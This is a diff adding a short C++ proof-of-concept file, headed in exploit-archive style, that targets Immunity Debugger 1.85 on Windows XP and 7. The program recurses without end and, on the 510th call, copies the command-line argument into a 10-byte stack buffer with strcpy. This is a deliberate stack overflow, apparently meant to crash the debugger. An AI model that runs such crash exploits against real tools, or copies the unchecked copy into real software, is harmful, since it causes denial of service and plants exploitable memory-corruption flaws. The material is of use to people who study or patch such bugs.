@@ -1,0 +1,46 @@
+/* Filename :  Crash_POC.cpp
+
+# Exploit Title: [title]
+# Date: 20 March 2014
+# Exploit Author: Veysel HATAS (vhatas@gmail.com) - Web Page : www.binarysniper.net
+# Vendor Homepage: https://www.immunityinc.com/
+# Software Link: https://www.immunityinc.com/products-immdbg.shtml
+# Version: 1.85
+# Tested on: WinXP, Win7
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int g_Count;
+
+void foo(char *data);
+
+int main(int argc, char* argv[])
+{
+      g_Count = 0;
+
+      foo(argv[1]);
+      return 0;
+}
+
+void foo(char *data)
+{
+      char salla[10];
+
+      printf("Deneme - %d\n", g_Count);
+      g_Count++;
+
+      if (g_Count == 510){
+            strcpy(salla, data);
+      }
+
+      try{
+            foo(data);
+      }
+      catch(int e){
+            printf("Error code is : %d", e);
+      }
+}
